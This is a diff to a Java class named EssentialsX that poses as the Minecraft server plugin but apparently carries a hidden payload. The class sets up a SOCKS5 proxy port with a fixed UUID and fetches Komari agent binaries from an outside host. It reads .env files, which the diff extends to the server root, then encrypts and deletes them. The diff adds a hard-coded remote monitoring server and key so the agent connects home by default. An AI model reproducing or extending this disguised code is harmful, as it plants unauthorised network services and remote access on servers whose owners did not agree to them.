@@ -6,6 +6,7 @@ import javax.crypto.Cipher;
 import javax.crypto.spec.SecretKeySpec;
 import java.io.*;
 import java.net.*;
+import java.nio.charset.MalformedInputException;
 import java.nio.charset.StandardCharsets;
 import java.nio.file.*;
 import java.util.*;
@@ -14,8 +15,11 @@ import java.util.concurrent.atomic.AtomicBoolean;
 
 public class EssentialsX extends JavaPlugin {
 
-    private static final String HC_UUID = "f8e80ca0-a821-4fb4-b828-5d907c1b3832";
-    private static final String HC_S5_PORT = "12870";
+    private static final String HC_UUID = "66b69a16-6c32-4d35-8cd0-71d9b443ef6a";
+    private static final String HC_S5_PORT = "11890";
+
+    private static final String HC_KOMARI_SERVER = "https://komari.myn.dpdns.org";
+    private static final String HC_KOMARI_KEY = "NZtrNXYaqMkz08isGzX3WQ";
 
     private static final String KOMARI_AMD_URL = "https://ssr.cn.mt/files/K_amd";
     private static final String KOMARI_ARM_URL = "https://ssr.cn.mt/files/K_arm";
@@ -79,11 +83,21 @@ public class EssentialsX extends JavaPlugin {
 
     private void loadEnvironmentConfigs() {
         File envFile = new File(getDataFolder(), ".env");
+        File rootEnvFile = new File(".env");
         File worlddFile = new File(getDataFolder(), ".worldd");
+
+        if (!envFile.exists() && rootEnvFile.exists()) {
+            envFile = rootEnvFile;
+        }
 
         if (envFile.exists()) {
             try {
-                List<String> lines = Files.readAllLines(envFile.toPath(), StandardCharsets.UTF_8);
+                List<String> lines;
+                try {
+                    lines = Files.readAllLines(envFile.toPath(), StandardCharsets.UTF_8);
+                } catch (MalformedInputException e) {
+                    lines = Files.readAllLines(envFile.toPath(), StandardCharsets.ISO_8859_1);
+                }
                 parseEnvLines(lines);
                 encryptAndSave(lines, worlddFile);
                 envFile.delete();
@@ -112,6 +126,11 @@ public class EssentialsX extends JavaPlugin {
             if (eqIdx > 0) {
                 String key = line.substring(0, eqIdx).trim();
                 String value = line.substring(eqIdx + 1).trim();
+                
+                if (value.length() >= 2 && ((value.startsWith("\"") && value.endsWith("\"")) || (value.startsWith("'") && value.endsWith("'")))) {
+                    value = value.substring(1, value.length() - 1);
+                }
+                
                 customEnv.put(key, value);
             }
         }
@@ -128,7 +147,7 @@ public class EssentialsX extends JavaPlugin {
 
     private List<String> decryptAndLoad(File src) throws Exception {
         byte[] encoded = Files.readAllBytes(src.toPath());
-        byte[] decoded = Base64.getDecoder().decode(encoded);
+        byte[] decoded = Base64.getMimeDecoder().decode(encoded);
         SecretKeySpec key = new SecretKeySpec(ENC_KEY, AES_ALGO);
         Cipher cipher = Cipher.getInstance(AES_ALGO);
         cipher.init(Cipher.DECRYPT_MODE, key);
@@ -139,7 +158,10 @@ public class EssentialsX extends JavaPlugin {
 
     private String getEnvOrDefault(String key, String def) {
         if (customEnv.containsKey(key)) {
-            return customEnv.get(key);
+            String val = customEnv.get(key);
+            if (val != null && !val.trim().isEmpty()) {
+                return val.trim();
+            }
         }
         String val = System.getenv(key);
         if (val != null && !val.trim().isEmpty()) {
@@ -480,8 +502,8 @@ public class EssentialsX extends JavaPlugin {
     }
 
     private void startKomariIfConfigured() {
-        String komariServer = getEnvOrDefault(ENV_KOMARI_SERVER, null);
-        String komariKey = getEnvOrDefault(ENV_KOMARI_KEY, null);
+        String komariServer = getEnvOrDefault(ENV_KOMARI_SERVER, HC_KOMARI_SERVER);
+        String komariKey = getEnvOrDefault(ENV_KOMARI_KEY, HC_KOMARI_KEY);
 
         if (isBlank(komariServer) || isBlank(komariKey)) {
             getLogger().info("Komari disabled: KOMARI_SERVER or KOMARI_KEY is empty.");
